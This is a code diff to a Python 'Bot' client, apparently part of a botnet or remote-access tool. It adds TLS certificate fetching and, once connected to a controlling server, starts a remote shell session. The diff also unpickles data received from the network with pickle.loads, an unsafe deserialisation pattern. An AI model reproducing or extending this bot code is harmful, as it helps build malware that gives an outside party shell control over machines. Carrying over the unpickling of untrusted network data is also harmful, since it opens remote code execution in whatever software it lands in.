@@ -2,20 +2,41 @@
 # Author: Pure-L0G1C
 # Description: Bot 
 
+import ssl
+import json
 import socket
-from os import getcwd
+import pickle
 from time import sleep 
-from lib import shell, crypto, session
+from os import getcwd, path
+from lib import shell, session
+
+# cert path
+config = {
+  'cert_path': 'public.crt'
+}
+
+config_file = 'config.json'
+
+if not path.exists(config_file):
+ with open(config_file, 'wt') as f:
+  json.dump(config, f)
 
 class Bot(object):
  
  def __init__(self, home):
+  self.cert = self.cert_path
   self.is_active = False 
   self.is_alive = True
   self.home = home
   self.conn = None 
   self.port = None 
   self.ip = None
+
+ @property 
+ def cert_path(self):
+  if path.exists(config_file):
+   with open(config_file, 'rt') as f:
+    return json.load(f)['cert_path']
 
  def shutdown(self):
   try:
@@ -24,11 +45,10 @@ class Bot(object):
   except:pass
 
  def connect(self):
-  publ_key, priv_key = crypto.CryptoRSA.generate_keys()
-  self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s = session.Session(self.conn, priv_key, publ_key)
-  services = s.connect(self.ip, self.port)
-
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  self.conn = ssl.wrap_socket(sock, ca_certs=self.cert, cert_reqs=ssl.CERT_REQUIRED)
+  s = session.Session(self.conn)
+  services = s.connect(self.ip, self.port, 2)
   if not services:
    self.ip, self.port, self.is_active = None, None, False
    self.display_text('Error: Server is unavailable, trying again in a bit')
@@ -37,6 +57,20 @@ class Bot(object):
    self.is_active = True
    _shell.shell()
 
+ def get_cert(self):
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s = session.Session(sock)
+  resp = s.connect(self.ip, self.port, 1)
+  if resp:
+   resp = pickle.loads(resp)
+   with open(self.cert, 'wb') as f:
+    self.port = resp['port']
+    self.ip = resp['ip']
+    f.write(resp['cert'])
+  s.shutdown() 
+  if resp:
+   return True 
+
  # -------- UI -------- #
 
  def display_text(self, text):
@@ -44,7 +78,9 @@ class Bot(object):
 
  def contact_server(self, ip, port):
   self.ip, self.port = ip, int(port)
-  self.connect()
+  if self.get_cert():
+   sleep(1.5)
+   self.connect()
 
 if  __name__ == '__main__':
  home = getcwd()
